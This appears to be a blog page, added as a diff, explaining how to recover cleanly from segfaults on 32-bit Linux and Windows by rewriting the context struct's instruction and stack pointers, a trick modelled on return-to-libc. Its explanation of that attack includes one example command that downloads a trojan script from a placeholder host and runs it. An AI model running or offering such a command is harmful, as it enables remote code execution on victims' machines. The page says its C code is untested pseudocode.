@@ -1,0 +1,225 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Cleanly recovering from Segfaults under Windows and Linux (32-bit)</title>
+
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/pygment_trac.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1>Cleanly recovering from Segfaults under Windows and Linux (32-bit)</h1>
+
+
+        <p class="view"><a href="/">back to index</a></p>
+
+      </header>
+      <section>
+<h2>two brief notes</h2>
+
+<p>First. Windows calls &#39;em access violations, Linux calls &#39;em segfaults. I&#39;m a linux person, so I&#39;ll
+go with segfaults. They&#39;re the same thing though.</p>
+
+<p>Second. My code may look like C, but since it&#39;s ported from a decidedly not-C language and
+I didn&#39;t actually test it to see if it compiles, you should treat it like pseudocode.
+Caveat lexor. (look ma I&#39;m classy)</p>
+
+<h2>the problem</h2>
+
+<p>Segfault crashes are annoying. Most exceptions can be caught, but segfaults are the archetypal
+instant/total crash. Ways of handling them tend to rely on system-specific methods and have their
+own idiosyncracies. In this article I&#39;m gonna outline how to recover from segfaults under Linux
+(probably at least some other POSIX systems as well) as well as Windows (32-bit each). Interestingly,
+the approach is quite similar, and should generalize to 64-bit systems with minor prodding assuming
+you&#39;re familiar with the 64-bit version of cdecl.</p>
+
+<h2>the basic idea</h2>
+
+<p>Both Windows and Linux let you define handler functions that are executed when a segfault occurs.
+In theory we could throw an exception right from the handler, but this is <strong>highly iffy</strong>
+because the operating system treats &quot;the state of being in a handler function&quot; as special.
+We can&#39;t return from the handler function either, because that&#39;ll just bring us back to the
+crash site. Instead, we need to take a page out of the Black Hat Book.</p>
+
+<h2>return-to-libc</h2>
+
+<p>Almost all exploits are concerned primarily with getting the target computer to execute arbitrary
+code. Buffer overflows let you overwrite variables, but they usually don&#39;t let you change <em>code</em>,
+because assembler code does not live on the stack. There&#39;s a trick to bypass this, though,
+and it&#39;s called the return-to-libc attack.</p>
+
+<p>Basically, it would be enough if we could call one C library function with arbitrary arguments.
+For instance, the function could be system() and the argument could be
+<code>wget http://crackedserver.cc/trojan.sh &amp;&amp; sh -c trojan.sh</code>. But we can&#39;t change code, so
+we cannot insert a call instruction, even with a buffer overflow.</p>
+
+<p>We can, however, reuse a call instruction that&#39;s already there.</p>
+
+<p>Did you know that the &quot;ret&quot; instruction works like a jump that takes its address from the stack?</p>
+
+<p>The way function calls work is, the &quot;call&quot; instruction pushes the next instruction address
+after the &quot;call&quot; onto the stack (in most cases, the same stack as used for static buffers
+, although some rare architectures have dedicated instruction stacks [and thus
+are immune to this attack]), then executes a jump to the target function. Symmetrically,
+the &quot;ret&quot;[urn] instruction simply pops an address from the stack and jumps to it.</p>
+
+<p>Knowing this, our attack is simple: use a buffer overflow to overwrite the return address of the
+current function with <code>&amp;system</code>, and provide the appropriate arguments for it. This is made easier
+by the fact that for historical reasons, most stacks grow <em>downwards</em>, as opposed to static buffers
+on the stack, which naturally grow upwards.</p>
+
+<p>We are going to make use of a similar approach.</p>
+
+<h2>applying this to segfault recovery</h2>
+
+<p>We want the segfault handler to execute arbitrary code without being limited to what the OS
+deems &quot;safe&quot; for handlers. For that, we need to execute a jump to the address of our userspace
+(non-handler) handler function. But we can&#39;t rewrite the callsite.</p>
+
+<p>We <em>can</em> rewrite the stack. And we have one &quot;ret&quot; instruction available.</p>
+
+<p>On both Windows and Linux, the segfault handler function is passed a &quot;context struct&quot;, which
+includes the state of the registers at the failure site. Ostensibly, this is so people can
+repair the problem that caused the segfault (it also lets you do nifty things like userspace
+segment handling). However, what we&#39;re going to do is to set up an imitation of the effects
+of a call instruction on the stack (<code>push ip</code>), then rewrite the instruction pointer in that struct
+and let the operating system&#39;s return to user code do the work for us - instead of returning to the
+failing code, it&#39;s going to return to a handler function.</p>
+
+<p>Enough talk. Bring the code!</p>
+
+<h2>the code</h2>
+
+<h3>linux</h3>
+
+<pre><code>#include &quot;signal.h&quot;
+void seghandle_userspace() {
+  // note: because we set up a proper stackframe,
+  // unwinding is safe from here.
+  // also, by the time this function runs, the
+  // operating system is &quot;done&quot; with the signal.
+
+  // choose language-appropriate throw instruction
+  // raise new MemoryAccessError &quot;Segmentation Fault&quot;;
+  // throw new MemoryAccessException;
+  // longjmp(erroneous_exit);
+  // asm { int 3; }
+  *(int*) NULL = 0;
+}
+enum X86Registers {
+  GS, FS, ES, DS, EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX,
+  TRAPNO, ERR, EIP, CS, EFL, UESP, SS
+}
+void seghandle(int sig, void* si, void* unused) {
+  ucontext_t* uc = (ucontext_t*) unused;
+  // No. I refuse to use triple-pointers.
+  // Just pretend ref a = v; is V* ap = &amp;v;
+  // and then substitute a with (*ap).
+  ref gregs = uc-&gt;uc_mcontext.gregs;
+  ref eip = (void*) gregs[X86Registers.EIP],
+  ref esp = (void**) gregs[X86Registers.ESP];
+
+  // imitate the effects of &quot;call seghandle_userspace&quot;
+  esp --; // decrement stackpointer.
+          // remember: stack grows down!
+  *esp = eip;
+
+  // set up OS for call via return, like in the attack
+  eip = (void*) &amp;seghandle_userspace;
+}
+void setup_segfault_handler() {
+  struct sigaction sa;
+  sa.flags = SA_SIGINFO;
+  sigemptyset (&amp;sa.mask);
+  sa.sigaction = &amp;seghandle;
+  if (sigaction(SIGSEGV, &amp;sa, NULL) == -1) {
+    fprintf(stderr, &quot;failed to setup SIGSEGV handler\n&quot;);
+    exit(1);
+  }
+}
+</code></pre>
+
+<p>So on SIGSEGV, <code>seghandle</code> is called (as a signal handler), rewrites the signal&#39;s instruction address
+to <code>seghandle_userspace</code>, then returns to the OS, which in returning to user code jumps to
+<code>seghandle_userspace</code>, which then throws an exception or does whatever else it likes.</p>
+
+<h3>windows</h3>
+
+<p>Under Windows, this is slightly more involved. (Of course it is. Have you seen the size of a
+typical winapi function as compared to POSIX?)</p>
+
+<p>What surprised me though, was how similar the approach is under Windows. The Linux approach can almost
+be copied 1:1.</p>
+
+<p>Big credit goes to Matt Pietrek and the highly valuable <a href="http://www.microsoft.com/msj/0197/exception/exception.aspx">crash course on the Depths of Win32™
+SEH</a>.</p>
+
+<p>Basically, Windows uses SEH (Structured Exception Handling) to cope with critical errors.
+You&#39;ve seen SEH before - the default SEH handler is the &quot;This application has stopped working&quot;
+pop-up.
+SEH handlers are tracked with a linked list stored in <code>FS[0]</code>. This is
+the one part where you may need some assembler, or use your compiler&#39;s built-in primitives
+(<code>_try</code>/<code>_except</code>) where provided. I&#39;m going to assume that <code>_try</code>/<code>_except</code> is not available.</p>
+
+<p>Okay. When a SEH error happens under Windows, the operating system grabs the list of handlers
+from <code>FS[0]</code>, then queries them in order to see if any of them will handle the error. Handlers
+have the choice to say &quot;keep looking&quot;, &quot;return to user code&quot; or &quot;invoke exception handler&quot;.</p>
+
+<p>A useful note: if we pass over an exception and let the operating system handle it, it will call
+our handler again with EH_UNWINDING set. Since the other parameters will be unchanged,
+and the function probably won&#39;t try to suddenly handle an exception it just passed over,
+this mostly need not concern us.</p>
+
+<p>The code!</p>
+
+<pre><code>  #include &quot;winbase.h&quot;
+  #include &quot;windows.h&quot;
+  #include &quot;excpt.h&quot;
+  void seghandle_userspace() {
+    // see above re. what to do now
+    *(int*) NULL = 0;
+  }
+  EXCEPTION_DISPOSITION seghandle
+  (_EXCEPTION_RECORD* record, void* establisher_frame,
+   _CONTEXT* context, void* dispatcher_context
+  ) {
+    // see above
+    ref
+      esp = (void**)context.Esp,
+      eip = (void* )context.Eip;
+    // imitate the effects of &quot;call seghandle_userspace&quot;
+    // stack grows down under windows, too
+    esp --;
+    *esp = eip;
+    // rewrite eip for return-to-lib, same as linux
+    eip = (void*) &amp;seghandle_userspace;
+    // and back to user code.
+    return ExceptionContinueExecution;
+  }
+  void setup_segfault_handler() {
+    _EXCEPTION_REGISTRATION reg;
+    // Note: this bit will require assembly.
+    // Consult your compiler vendor documentation.
+    reg.prev = FS[0];
+    reg.handler = &amp;seghandle;
+    FS[0] = &amp;reg;
+    // note: do this on exit
+    // fs[0] = ((_EXCEPTION_REGISTRATION) fs[0]).prev;
+  }
+</code></pre>
+      </section>
+      <footer>
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="javascripts/scale.fix.js"></script>
+    
+  </body>
+</html>
